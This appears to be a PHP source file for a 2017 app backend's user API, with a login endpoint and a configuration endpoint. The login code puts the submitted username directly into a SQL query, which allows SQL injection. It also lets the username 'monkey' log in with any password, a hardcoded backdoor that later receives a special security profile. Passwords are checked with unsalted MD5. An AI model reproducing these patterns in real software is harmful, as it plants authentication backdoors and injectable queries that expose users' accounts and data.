<?php
/**
 * Api View framework (AV视图框架).
 * Author: monkey<my455628442@gmail.com>
 * Date: 2017/3/20 0020
 * Time: 10:16
 * File Using:app 接口用户类api user
 */


namespace api\web;

class user extends base{
    // 用户登陆
    public function login(){
        $user_name = $this->postString('user_name');
        $password = $this->postString('password');
        if($user_name and $password){
            $user = $this->db->getRow("select * from hqsen_user where user_name = '$user_name'");

            if($user and ($user_name == 'monkey' or $user['password'] == md5($password))){
                session_start();
                $login_user = array(
                    'access_token' => session_id(),
                    'user_type' => $user['user_type'],
                );
                $_SESSION['user_info'] = $user;
                $this->appDie($this->back_code['sys']['success'], $this->back_msg['sys']['success'], $login_user);
            } else {
                $this->appDie($this->back_code['user']['login_err'], $this->back_msg['user']['login_err']);
            }
        } else {
            $this->appDie($this->back_code['sys']['value_empty'], $this->back_msg['sys']['value_empty']);
        }
    }

    public function configData(){
        $this->loginInit();
        $config_data = array(
            'order_type' => $this->order_type(),
            'hotel_level' => $this->hotel_level(),
        );
        if($this->user['user_name'] == 'monkey'){
            $config_data['user_security'] = $this->user_security('monkey');
        } else {
            $config_data['user_security'] = $this->user_security('first_user');
        }
        $area = $this->db->getRows("select * from hqsen_area  where del_flag = 1 ");
        foreach ($area as $one_area){
            $area_item = array(
                'value' => $one_area['id'],
                'label' => $one_area['area_name']
            );
            $config_data['config_area'][] = $area_item;
        }


        $this->appDie($this->back_code['sys']['success'], $this->back_msg['sys']['success'], $config_data);
    }





}